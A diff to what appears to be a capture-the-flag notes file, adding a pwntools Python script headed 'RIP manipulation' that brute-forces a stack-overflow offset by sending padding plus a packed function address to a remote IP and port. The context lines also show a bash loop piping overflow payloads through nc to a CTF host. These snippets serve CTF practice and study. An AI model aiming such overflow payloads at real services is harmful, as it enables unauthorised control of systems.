@@ -358,3 +358,34 @@ volatility -f ch2.dmp --profile=Win7SP0x86 envars | grep COMPUTERNAME
 ```
 for i in {0..255}; do python -c "print 'A'*${i}+'\x11\xba\x07\xf0'" | nc somectf.com 4321 ; done
 ```
+
+RIP manipulation.
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+fnc = p64(0x00400766)
+
+def leak(offset):
+    s = remote('139.59.30.165', 8700, level='error')
+
+    s.recv()
+
+    payload = ('A' * offset) + fnc
+    
+    s.sendline(payload)
+
+    try:
+        print s.recv()
+
+        return True
+    except:
+        pass
+
+    s.close()
+
+for i in xrange(0, 100):
+    if leak(i):
+        break
+```
